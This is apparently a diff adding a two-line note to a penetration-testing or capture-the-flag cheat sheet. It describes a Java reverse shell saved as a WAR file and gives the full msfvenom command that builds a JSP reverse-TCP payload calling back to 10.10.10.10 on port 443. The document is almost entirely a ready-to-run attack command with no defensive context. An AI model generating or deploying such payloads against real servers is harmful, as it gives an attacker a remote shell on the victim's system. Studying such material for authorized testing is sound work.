@@ -1,0 +1,2 @@
+this is a java reverse shell thats been saved as a WAR (web application resource)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o rshell.war
